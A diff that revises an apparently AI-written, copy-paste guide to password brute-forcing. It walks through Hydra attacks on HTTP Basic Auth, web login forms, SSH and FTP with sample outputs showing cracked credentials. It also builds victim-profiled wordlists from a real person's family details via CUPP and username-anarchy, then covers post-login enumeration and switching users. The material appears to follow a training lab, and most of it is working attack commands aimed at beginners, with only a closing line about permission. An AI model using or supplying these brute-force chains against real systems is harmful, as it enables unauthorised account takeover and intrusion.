@@ -1,217 +1,331 @@
-I'll give you a **simple step‑by‑step guide** that shows exactly **where to put your target information** (IP, port, username, password list, etc.) in each command.  
-You don’t need any prior knowledge – just copy the commands and replace the parts marked in `< >` with your own details.
+I’ll give you a **complete step‑by‑step guide** with **commands**, **explanations** of what to replace, and **example outputs** so you know exactly what to expect.  
+I’ll highlight the parts you need to check after each step.
 
 ---
 
-## 1. Basic structure of a Hydra command
-
-Most Hydra commands follow this pattern:
-
+## 1. Hydra help – see what services you can attack
+**Command:**  
 ```bash
-hydra [options] service://<target_ip>:<port>
+hydra -h | grep "Supported services"
 ```
+**What to replace:** Nothing.
 
-- **`<target_ip>`** = the IP address of the machine you are attacking.
-- **`<port>`** = the port number the service is running on (e.g., 80 for HTTP, 22 for SSH, 21 for FTP).
-- **`service`** = the protocol (e.g., `http-get`, `http-post-form`, `ssh`, `ftp`).
-
-The options tell Hydra which usernames and passwords to try.
-
----
-
-## 2. How to get your target’s IP and port
-
-If you are in a lab or a CTF, you will usually be given an IP address and a port number.  
-For example, in the module they used `178.35.49.134` and ports like `32901` or `31099`.  
-Replace those with your own target IP and port.
-
----
-
-## 3. Step-by-step commands with placeholders
-
-### Step 1: Hydra help (no target needed)
-```bash
-hydra -h
+**Example output:**
 ```
-This just shows help. No target info needed.
+Supported services: adam6500 asterisk cisco cisco-enable cvs firebird ftp[s] http[s]-{head|get|post} http[s]-{get|post}-form http-proxy http-proxy-urlenum icq imap[s] irc ldap2[s] ldap3[-{cram|digest}md5][s] memcached mongodb mssql mysql nntp oracle-listener oracle-sid pcanywhere pcnfs pop3[s] postgres radmin2 rdp redis rexec rlogin rpcap rsh rtsp s7-300 sip smb smtp[s] smtp-enum snmp socks5 ssh sshkey svn teamspeak telnet[s] vmauthd vnc xmpp
+```
+✅ **Check:** This list shows you all protocols Hydra can attack (e.g., `http-get`, `http-post-form`, `ssh`, `ftp`).
 
 ---
 
-### Step 2: Brute‑force HTTP Basic Auth with a combined wordlist (default credentials)
-
-**Command:**
+## 2. Brute‑force HTTP Basic Auth with a combined wordlist (default credentials)
+**Command template:**  
 ```bash
 hydra -C /path/to/combined_wordlist.txt <target_ip> -s <port> http-get /
 ```
 **What to replace:**
-- `/path/to/combined_wordlist.txt` – use the path to a file that contains `username:password` pairs. The module uses `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`.
-- `<target_ip>` – your target IP.
-- `<port>` – the port number (e.g., 31099).
+- `/path/to/combined_wordlist.txt` → the file containing `username:password` pairs.  
+  Example: `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt`
+- `<target_ip>` → the IP address of the target (e.g., `178.211.23.155`)
+- `<port>` → the port number (e.g., `31099`)
 
-**Example with actual values:**
+**Example command:**  
 ```bash
 hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.211.23.155 -s 31099 http-get /
 ```
 
-**What to look for:** Hydra will show a line like `[http-get] host: ... login: test password: testingpw` when it finds a working pair.
+**Example output:**  
+```
+Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 66 login tries, ~5 tries per task
+[DATA] attacking http-get://178.211.23.155:31099/
+[31099][http-get] host: 178.211.23.155   login: test   password: testingpw
+[STATUS] attack finished for 178.211.23.155 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+```
+✅ **Check:** Look for a line starting with `[port][http-get]` – it shows the found `login` and `password`. In this case, `test:testingpw`.  
+Then open a browser and visit `http://<target_ip>:<port>` and use those credentials to confirm.
 
 ---
 
-### Step 3: Brute‑force HTTP Basic Auth with separate username and password wordlists
-
-**Command:**
+## 3. Brute‑force HTTP Basic Auth with separate username and password wordlists
+**Command template:**  
 ```bash
 hydra -L /path/to/usernames.txt -P /path/to/passwords.txt -u -f <target_ip> -s <port> http-get /
 ```
 **What to replace:**
-- `/path/to/usernames.txt` – your username wordlist (e.g., `/opt/useful/SecLists/Usernames/Names/names.txt`).
-- `/path/to/passwords.txt` – your password wordlist (e.g., `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt`).
-- `<target_ip>` – your target IP.
-- `<port>` – the port.
+- `/path/to/usernames.txt` → e.g., `/opt/useful/SecLists/Usernames/Names/names.txt`
+- `/path/to/passwords.txt` → e.g., `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt`
+- `<target_ip>` → target IP
+- `<port>` → target port
 
-**Example:**
+**Example command:**  
 ```bash
 hydra -L /opt/useful/SecLists/Usernames/Names/names.txt -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -u -f 178.35.49.134 -s 32901 http-get /
 ```
 
+**Example output:**  
+```
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 243854766 login tries (l:17/p:14344398), ~15240923 tries per task
+[DATA] attacking http-get://178.35.49.134:32901/
+[STATUS] 9105.00 tries/min, 9105 tries in 00:01h, 243845661 to do in 446:22h, 16 active
+
+[32901][http-get] host: 178.35.49.134   login: thomas   password: thomas1
+[STATUS] attack finished for SERVER_IP (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+```
+✅ **Check:** The same pattern – find the line with `[http-get]` that shows a valid `login:password`.  
+Note: This attack can take a long time; the `-f` flag stops at the first successful pair.
+
 ---
 
-### Step 4: Brute‑force a login form (POST) – with a fixed username
-
-**Command:**
+## 4. Brute‑force a login form (POST) with a static username
+**Command template:**  
 ```bash
-hydra -l <username> -P /path/to/passwords.txt -f <target_ip> -s <port> http-post-form "/login.php:username=^USER^&password=^PASS^:F=<fail_string>"
+hydra -l <username> -P /path/to/passwords.txt -f <target_ip> -s <port> http-post-form "<url_path>:<post_params>:F=<fail_string>"
 ```
 **What to replace:**
-- `<username>` – the username you want to test (e.g., `admin`).
-- `/path/to/passwords.txt` – your password wordlist.
-- `<target_ip>` – target IP.
-- `<port>` – port number.
-- `/login.php` – the URL path of the login page (it could be `/login.php`, `/admin/login`, etc. – you must find it).
-- `username` and `password` – these are the field names from the login form. Replace them with the actual names (commonly `username`, `user`, `email`, etc.).
-- `<fail_string>` – a piece of text that appears **only when login fails**. Usually found by viewing the page source (e.g., `<form name='login'`).
+- `<username>` → a single username to test (e.g., `admin`)
+- `/path/to/passwords.txt` → password wordlist
+- `<target_ip>`, `<port>` → target IP and port
+- `<url_path>` → the login page, e.g., `/login.php`
+- `<post_params>` → the POST data with placeholders `^USER^` and `^PASS^`.  
+  Example: `username=^USER^&password=^PASS^`
+- `<fail_string>` → a string that appears **only when login fails**.  
+  Find it by viewing the HTML source of the login page (Ctrl+U) and picking something unique, like `<form name='login'`.
 
-**How to find the login page and field names:**
-1. Open the login page in your browser.
-2. Press `Ctrl+Shift+E` (Firefox) or `F12` to open developer tools → Network tab.
-3. Try to log in with any dummy credentials (e.g., `test:test`).
-4. In the Network tab, click on the request that was sent to the server (usually named `login.php` or similar).
-5. Look at the **Request** section; you will see the POST data like `username=test&password=test`. That tells you the field names.
-6. The **URL path** is shown at the top (e.g., `/login.php`).
-7. For the fail string, go to the **Response** tab or view the page source (`Ctrl+U`) and find a unique string that only appears on the login page (like a button text, a form name, or an error message). In the module they used `<form name='login'`.
+**How to find the POST parameters and fail string:**  
+1. Open the login page in Firefox.  
+2. Press `Ctrl+Shift+E` to open the Network tab.  
+3. Try to log in with dummy credentials (e.g., `test:test`).  
+4. Right‑click the login request → **Copy** → **Copy POST data**.  
+   You’ll get something like `username=test&password=test`.  
+5. The `<url_path>` is shown at the top of the request (e.g., `/login.php`).  
+6. For the fail string, go to the page source (`Ctrl+U`) and search for text that only exists on the login page – e.g., the login button or a form name. In the module they used `<form name='login'`.
 
-**Example command:**
+**Example command:**  
 ```bash
 hydra -l admin -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt -f 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
 ```
 
----
-
-### Step 5: Brute‑force SSH with your own wordlists
-
-**Command:**
-```bash
-hydra -L /path/to/usernames.txt -P /path/to/passwords.txt -u -f ssh://<target_ip>:<port> -t 4
+**Example output:**  
 ```
-**What to replace:**
-- `/path/to/usernames.txt` – your username wordlist.
-- `/path/to/passwords.txt` – your password wordlist.
-- `<target_ip>` – target IP.
-- `<port>` – SSH port (usually 22).
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344398 login tries (l:1/p:14344398), ~896525 tries per task
+[DATA] attacking http-post-form://178.35.49.134:32901/login.php:username=^USER^&password=^PASS^:F=<form name='login'
 
-**Example:**
-```bash
-hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
+[32901][http-post-form] host: 178.35.49.134   login: admin   password: password123
+[STATUS] attack finished for 178.35.49.134 (valid pair found)
 ```
+✅ **Check:** Look for `[http-post-form]` – it shows the found `login` and `password`. Then use those to log in via the web form.
 
 ---
 
-### Step 6: Brute‑force FTP with a fixed username
-
-**Command:**
-```bash
-hydra -l <username> -P /path/to/passwords.txt ftp://<target_ip>:<port>
-```
-**What to replace:**
-- `<username>` – the username you want to test.
-- `/path/to/passwords.txt` – your password wordlist.
-- `<target_ip>` – target IP.
-- `<port>` – FTP port (usually 21).
-
-**Example:**
-```bash
-hydra -l m.gates -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt ftp://127.0.0.1
-```
-
----
-
-## 4. Creating your own wordlists
-
-### Using CUPP to make a custom password wordlist
+## 5. Create a custom password wordlist with CUPP
+**Command:**  
 ```bash
 cupp -i
 ```
-You will be asked questions about the target (first name, last name, birthdate, etc.). Answer them.  
-**Where to put your info:** Just type the information when prompted. The output file will be named after the first name (e.g., `william.txt`).
+**What to replace:** Answer the interactive questions with information about the target (first name, surname, nickname, birthdate, etc.).  
+**Example interaction:**
+```
+> First Name: William
+> Surname: Gates
+> Nickname: Bill
+> Birthdate (DDMMYYYY): 28101955
+> Partners) name: Melinda
+> Partners) nickname: Ann
+> Partners) birthdate (DDMMYYYY): 15081964
+> Child's name: Jennifer
+> Child's nickname: Jenn
+> Child's birthdate (DDMMYYYY): 26041996
+> Pet's name: Nila
+> Company name: Microsoft
+> Do you want to add some key words about the victim? Y/[N]: Phoebe,Rory
+> Do you want to add special chars at the end of words? Y/[N]: y
+> Do you want to add some random numbers at the end of words? Y/[N]:y
+> Leet mode? (i.e. leet = 1337) Y/[N]: y
+```
+**Example output:**
+```
+[+] Now making a dictionary...
+[+] Sorting list and removing duplicates...
+[+] Saving dictionary to william.txt, counting 43368 words.
+```
+✅ **Check:** The file `william.txt` is created in the current directory. Use `ls` to verify.
 
-### Using username‑anarchy to generate username variants
+---
+
+## 6. Filter the wordlist according to a password policy
+If you know the policy (e.g., password must be ≥8 chars, contain special char and number), run:
+```bash
+sed -ri '/^.{,7}$/d' william.txt            # remove shorter than 8
+sed -ri '/[!-/:-@\[-`\{-~]+/!d' william.txt # keep only those with a special char
+sed -ri '/[0-9]+/!d' william.txt            # keep only those with a number
+```
+**Example output:** No output, but the file will shrink.  
+✅ **Check:** Run `wc -l william.txt` before and after to see the reduction (e.g., from 43368 to ~13000).
+
+---
+
+## 7. Generate a custom username list
+**Commands:**  
 ```bash
 git clone https://github.com/urbanadventurer/username-anarchy.git
 cd username-anarchy
 ./username-anarchy <First Name> <Last Name> > usernames.txt
 ```
-Replace `<First Name>` and `<Last Name>` with the target’s name.  
+**What to replace:** `<First Name>` and `<Last Name>` with the target’s name.  
 **Example:** `./username-anarchy Bill Gates > bill.txt`
 
-### Filtering a wordlist for password policies
-If you know the password policy (e.g., must be at least 8 chars, contain a special char and a number), use these commands on your wordlist file:
-
-```bash
-sed -ri '/^.{,7}$/d' your_wordlist.txt      # remove shorter than 8
-sed -ri '/[!-/:-@\[-`\{-~]+/!d' your_wordlist.txt   # keep only those with a special char
-sed -ri '/[0-9]+/!d' your_wordlist.txt       # keep only those with a number
-```
-Replace `your_wordlist.txt` with the actual filename.
+**Example output:** No output, but `bill.txt` is created.  
+✅ **Check:** `cat bill.txt` to see the list (e.g., `b.gates`, `bill.gates`, `bgates`, etc.).
 
 ---
 
-## 5. After finding credentials
+## 8. Brute‑force SSH with custom wordlists
+**Command template:**  
+```bash
+hydra -L /path/to/usernames.txt -P /path/to/passwords.txt -u -f ssh://<target_ip>:<port> -t 4
+```
+**What to replace:**
+- `/path/to/usernames.txt` → e.g., `bill.txt`
+- `/path/to/passwords.txt` → e.g., `william.txt`
+- `<target_ip>` → target IP
+- `<port>` → SSH port (usually 22)
 
-### SSH into the server
+**Example command:**  
+```bash
+hydra -L bill.txt -P william.txt -u -f ssh://178.35.49.134:22 -t 4
+```
+
+**Example output:**  
+```
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 157116 login tries (l:12/p:13093), ~39279 tries per task
+[DATA] attacking ssh://178.35.49.134:22/
+[STATUS] 77.00 tries/min, 77 tries in 00:01h, 157039 to do in 33:60h, 4 active
+[22][ssh] host: 178.35.49.134   login: b.gates   password: ...SNIP...
+[STATUS] attack finished for 178.35.49.134 (valid pair found)
+```
+✅ **Check:** Look for a line with `[ssh]` that shows the found `login` and `password`.
+
+---
+
+## 9. Log in via SSH
+**Command:**  
 ```bash
 ssh <username>@<target_ip> -p <port>
 ```
-Example: `ssh b.gates@178.35.49.134 -p 22`
-
-### FTP to the server
+**Example:**  
 ```bash
-ftp <target_ip> <port>   # if port is non‑standard, use ftp -p <port> or just ftp <target_ip> and enter the port when asked
+ssh b.gates@178.35.49.134 -p 22
 ```
-Example: `ftp 127.0.0.1`
+When prompted, enter the password found in the previous step.
 
-### Switch to another user (once you have a shell)
-```bash
-su - <username>
+**Example output:**  
 ```
-Example: `su - m.gates`
+b.gates@178.35.49.134's password: ********
+b.gates@bruteforcing:~$ whoami
+b.gates
+```
+✅ **Check:** You should see a shell prompt. Run `whoami` to confirm the user.
 
 ---
 
-## Summary – Where to put your own info
+## 10. After SSH access, enumerate other users and services
+**Commands:**  
+```bash
+ls /home
+netstat -antp | grep -i list
+```
+**Example output:**
+```
+b.gates  m.gates
+```
+```
+tcp        0      0 127.0.0.1:21            0.0.0.0:*               LISTEN      - 
+tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
+```
+✅ **Check:** Look for other users (here `m.gates`) and listening services (e.g., port 21 for FTP).
 
-| Command part          | What to replace it with                          | Example                                           |
-|-----------------------|--------------------------------------------------|---------------------------------------------------|
-| `<target_ip>`         | IP address of the target                         | `178.35.49.134`                                   |
-| `<port>`              | Port number                                      | `32901`                                           |
-| `/path/to/wordlist`   | Path to your wordlist file                       | `/opt/useful/SecLists/Passwords/rockyou.txt`      |
-| `<username>`          | A single username (like admin)                   | `admin`                                           |
-| `<username_field>`    | The name of the username field in the form       | `username`                                        |
-| `<password_field>`    | The name of the password field in the form       | `password`                                        |
-| `<fail_string>`       | Unique text that appears only on failed login    | `<form name='login'`                              |
-| `/login.php`          | The URL path to the login page                   | `/login.php`                                      |
-| `<First Name>`        | First name of the target (for username‑anarchy)  | `Bill`                                            |
-| `<Last Name>`         | Last name of the target                          | `Gates`                                           |
+---
 
-If you are ever unsure, run `hydra -h` or `hydra <module> -U` (e.g., `hydra http-post-form -U`) to see detailed syntax.
+## 11. Brute‑force FTP locally
+**Command template:**  
+```bash
+hydra -l <username> -P /path/to/passwords.txt ftp://127.0.0.1
+```
+**What to replace:**
+- `<username>` → the other user found (e.g., `m.gates`)
+- `/path/to/passwords.txt` → a short password list (e.g., `rockyou-10.txt`)
 
-**Important:** Always ensure you have legal permission to test the target before running any brute‑force attack.
+**Example:**  
+```bash
+hydra -l m.gates -P /opt/useful/SecLists/Passwords/Leaked-Databases/rockyou-10.txt ftp://127.0.0.1
+```
+
+**Example output:**  
+```
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 92 login tries (l:1/p:92), ~6 tries per task
+[DATA] attacking ftp://127.0.0.1:21/
+[21][ftp] host: 127.0.0.1   login: m.gates   password: <...SNIP...>
+1 of 1 target successfully completed, 1 valid password found
+```
+✅ **Check:** The `[ftp]` line shows the password for `m.gates`.
+
+---
+
+## 12. Connect to FTP or switch to that user
+**FTP login:**  
+```bash
+ftp 127.0.0.1
+```
+When prompted, enter `m.gates` and the password.  
+**Example output:**
+```
+Connected to 127.0.0.1.
+220 (vsFTPd 3.0.3)
+Name (127.0.0.1:b.gates): m.gates
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+200 PORT command successful.
+150 Here comes the directory listing.
+-rw-------    1 1001     1001           33 Sep 11 00:06 flag.txt
+226 Directory send OK.
+```
+
+**Switch user:**  
+```bash
+su - m.gates
+```
+Enter the password.  
+**Example output:**
+```
+m.gates@bruteforcing:~$ whoami
+m.gates
+```
+✅ **Check:** You should be logged in as the new user.
+
+---
+
+## Summary – what to replace in each command
+
+| Placeholder               | What to put there                                   | Example                           |
+|---------------------------|-----------------------------------------------------|-----------------------------------|
+| `<target_ip>`             | IP address of the target                            | `178.35.49.134`                   |
+| `<port>`                  | Port number                                         | `32901`                           |
+| `/path/to/combined_wordlist.txt` | Path to a file with username:password pairs | `/opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt` |
+| `/path/to/usernames.txt`  | Path to a username wordlist                         | `/opt/useful/SecLists/Usernames/Names/names.txt` |
+| `/path/to/passwords.txt`  | Path to a password wordlist                         | `/opt/useful/SecLists/Passwords/Leaked-Databases/rockyou.txt` |
+| `<username>`              | A single username                                   | `admin`                           |
+| `<url_path>`              | The path to the login page                          | `/login.php`                      |
+| `<post_params>`           | POST data with ^USER^ and ^PASS^                    | `username=^USER^&password=^PASS^` |
+| `<fail_string>`           | Unique text that appears only on failed login       | `<form name='login'`              |
+| `<First Name>`            | First name of the target (for username‑anarchy)     | `Bill`                            |
+| `<Last Name>`             | Last name of the target                             | `Gates`                           |
+
+**Always verify you have legal permission before attacking any target.**
